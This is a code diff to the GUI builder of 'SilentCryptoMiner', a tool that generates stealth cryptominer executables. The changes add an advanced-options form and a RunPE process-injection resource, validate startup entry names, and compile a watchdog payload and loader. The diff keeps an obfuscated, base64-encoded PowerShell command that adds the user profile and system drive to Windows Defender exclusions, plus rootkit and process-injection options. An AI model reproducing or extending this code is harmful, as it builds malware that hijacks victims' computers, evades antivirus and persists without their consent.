@@ -20,7 +20,8 @@ namespace SilentCryptoMiner
             InitializeComponent();
         }
 
-        public Advanced FA = new Advanced();
+        public AlgorithmSelection FormAS = new AlgorithmSelection();
+        public AdvancedOptions FormAO = new AdvancedOptions();
 
         public Random rand = new Random();
         public string advancedParamsXMR = "--randomx-no-rdmsr";
@@ -50,6 +51,7 @@ namespace SilentCryptoMiner
         public string Resources_winring;
         public string Resources_rootkiti;
         public string Resources_rootkitu;
+        public string Resources_runpe;
         public string Resources_parent;
 
         public string minerFind;
@@ -57,14 +59,17 @@ namespace SilentCryptoMiner
         public string eid;
         public string xid;
 
-        public string killWDCommands;
+        public string defenderCommands;
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            cFormAO.Items.Add(FormAO);
             Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
-            FA.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
+            FormAS.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
+            FormAO.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
             Codedom.F = this;
-            FA.F = this;
+            FormAS.F = this;
+            FormAO.F = this;
             randomiCache.Add("SilentCryptoMiner");
             eid = Randomi(1);
             xid = Randomi(1);
@@ -77,10 +82,18 @@ namespace SilentCryptoMiner
                 if (BuildErrorTest(listMiners.Items.Count == 0, "Error: Atleast 1 miner required to build.")) return;
                 if (BuildErrorTest(chkIcon.Checked && !File.Exists(txtIconPath.Text), "Error: Icon file could not be found.")) return;
 
+                if (chkInstall.Checked)
+                {
+                    foreach (var item in @"\/:*?""<>|")
+                    {
+                        if (BuildErrorTest(txtInstallEntryName.Text.Contains(item), "Error: Startup option \"Entry Name\" contains any of the following illegal characters: \\/:*?\"<>| ")) return;
+                    }
+                }
+
                 savePath = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
                 if(savePath.Length > 0)
                 {
-                    BackgroundWorker2.RunWorkerAsync();
+                    workerBuild.RunWorkerAsync();
                 }
             }
             catch (Exception ex)
@@ -89,7 +102,7 @@ namespace SilentCryptoMiner
             }
         }
 
-        private void BackgroundWorker2_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
+        private void workerBuild_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
         {
             try
             {
@@ -116,9 +129,10 @@ namespace SilentCryptoMiner
                 Resources_winring = Randomi(rand.Next(5, 20));
                 Resources_rootkiti = Randomi(rand.Next(5, 20));
                 Resources_rootkitu = Randomi(rand.Next(5, 20));
+                Resources_runpe = Randomi(rand.Next(5, 20));
                 Resources_parent = Randomi(rand.Next(5, 20));
 
-                killWDCommands = $"cmd /c powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{Randomi(rand.Next(2, 5), false)}#> Add-MpPreference <#{Randomi(rand.Next(2, 5), false)}#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#{Randomi(rand.Next(2, 5))}#> -Force <#{Randomi(rand.Next(2, 5))}#>"))}\"";
+                defenderCommands = $"cmd /c powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{Randomi(rand.Next(2, 5), false)}#> Add-MpPreference <#{Randomi(rand.Next(2, 5), false)}#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#{Randomi(rand.Next(2, 5))}#> -Force <#{Randomi(rand.Next(2, 5))}#>"))}\"";
 
                 StringBuilder minerbuilder = new StringBuilder(Properties.Resources.Program);
 
@@ -200,10 +214,9 @@ namespace SilentCryptoMiner
                             argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-gpu={Invoke(new Func<string>(() => miner.comboIdleGPU.Text.Replace("%", "")))}");
                         }
                     }
-                    string location = "SystemRoot";
                     string minerid = $"{minerFind}{(xmr ? xid : eid)}{miner.nid} ";
                     string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
-                    minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\",\"{4}\"}}", EncryptString(minerid), xmr ? xid : eid, EncryptString(minerid + Unamlib_Encrypt(argstr.ToString())), EncryptString(location), EncryptString(toggleRootkit.Checked ? "System32\\dialer.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
+                    minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\"}}", EncryptString(minerid), xmr ? xid : eid, EncryptString(minerid + Unamlib_Encrypt(argstr.ToString())), EncryptString(FormAO.toggleRootkit.Checked ? "System32\\dialer.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
                     fullnids.Add(string.Format("new string[] {{\"{0}\",\"{1}\"}}", EncryptString(minerid), xmr ? xid : eid));
                 }
 
@@ -214,7 +227,7 @@ namespace SilentCryptoMiner
                     BuildLog("Adding install... ");
                     if (toggleWatchdog.Checked)
                     {
-                        BuildLog("Compiling Watchdog...");
+                        BuildLog("Compiling Watchdog payload...");
                         string watchdogpath = savePathBase + "-watchdog";
                         if (Codedom.WatchdogCompiler(watchdogpath + ".exe", Properties.Resources.Watchdog, toggleAdministrator.Checked))
                         {
@@ -223,7 +236,7 @@ namespace SilentCryptoMiner
                                 ObfuscationMessage("Watchdog Payload", watchdogpath + ".exe");
                             }
 
-                            if (toggleShellcode.Checked)
+                            if (toggleShellcode.Checked || FormAO.toggleMemoryWatchdog.Checked)
                             {
                                 BuildLog("Compiling Watchdog loader...");
                                 if (Codedom.LoaderCompiler(watchdogpath + "-loader.exe", watchdogpath + ".exe", $"\"{watchdogID}\"", null, false, toggleAdministrator.Checked))
@@ -622,7 +635,12 @@ namespace SilentCryptoMiner
 
         private void btnMinerAdd_Click(object sender, EventArgs e)
         {
-            FA.Show();
+            FormAS.Show();
+        }
+
+        private void btnAdvancedOptions_Click(object sender, EventArgs e)
+        {
+            FormAO.Show();
         }
 
         private void btnMinerEdit_Click(object sender, EventArgs e)
@@ -670,6 +688,7 @@ namespace SilentCryptoMiner
                 try
                 {
                     FormSerializer.Deserialise(this, loadpath);
+                    FormAO = (AdvancedOptions)cFormAO.Items[0];
                     ReloadMinerList();
                 } 
                 catch {
